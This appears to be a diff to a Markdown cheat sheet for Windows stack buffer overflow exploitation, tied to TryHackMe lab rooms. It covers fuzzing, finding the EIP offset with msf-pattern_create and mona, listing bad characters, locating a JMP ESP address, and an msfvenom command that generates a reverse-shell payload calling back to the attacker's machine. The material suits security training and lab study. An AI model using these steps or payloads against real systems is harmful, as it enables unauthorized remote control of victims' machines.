@@ -1,8 +1,16 @@
 # Buffer Overflow
 
+## **Windows**
+
+**Examples**
+
+[buffer-overflow-prep.md](../../../walkthroughs/tryhackme/buffer-overflow-prep.md "mention")[brainstorm.md](../../../walkthroughs/tryhackme/brainstorm.md "mention")[gatekeeper.md](../../../walkthroughs/tryhackme/gatekeeper.md "mention")[brainpan-1.md](../../../walkthroughs/tryhackme/brainpan-1.md "mention")
+
 ## **Crash Replication & Controlling EIP**
 
 Run fuzzer against program to find how many bytes it takes to crash the program.
+
+**Option #1**
 
 **Kali**
 
@@ -10,12 +18,31 @@ Run fuzzer against program to find how many bytes it takes to crash the program.
 python fuzzer.py $VICTIM $VICTIMPORT
 ```
 
+**Option #2**&#x20;
+
+**Kali**
+
+```
+python -c 'print("A"* 3000)'
+nc -v $TESTMACHINE 9999
+```
+
 Run following command and add output to your buffer in your exploit program.
+
+**Option #1**
 
 **Kali**
 
 ```
  msf-pattern_create -l $bytesToCrashProgram
+```
+
+**Option #2**&#x20;
+
+I then used pattern\_create to make my payload and then added to my new script exploit.py
+
+```
+/opt/metasploit-framework-5101/tools/exploit/pattern_create.rb -l $bytesToCrashProgram
 ```
 
 Run the exploitable program within Immunity Debugger with your updated exploit code. then you could be able to find the EIP offset. Update your code to have this many As be sent. Then add 4 Bs and remove the output from msf-pattern\_create. Rerun again and the EIP should be set as your Bs(42424242)
@@ -25,6 +52,8 @@ Run the exploitable program within Immunity Debugger with your updated exploit c
 ```
 !mona findmsp -distance $bytesToCrashProgram
 ```
+
+### Finding Bad Characters
 
 **Bad Chars #1**
 
@@ -72,7 +101,31 @@ b"\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
 )
 ```
 
+### Finding a Jump Point
 
+Now we need to find a place to jump to to run our payload.  We find there is only one place that will meets our conditions that we need which is an address with  SafeSEH, ASLR, and NXCompat disabled and the  memory address doesn't start with 0x00. ex: 0x0040000 won't work, 0x100000 will work. essfunc.dll meets this criteria.&#x20;
+
+**Immunity Debugger**
+
+```
+!mona modules
+```
+
+
+
+**Immunity Debugger**
+
+```
+!mona find -s "\xff\xe4" -m $DLL.dll
+```
+
+### Exploit
+
+Now that we have the return address to use, we just need to generate our payload without using the bad characters found previously. I also added 16 NOPs before the payload as suggested in the room. All that is left is to is to update our code with our payload and run it against the program.
+
+```
+msfvenom -p windows/shell_reverse_tcp LHOST=$KALI LPORT=4444 EXITFUNC=thread -b "\x00\x07\x2e\xa0" -f c
+```
 
 
 
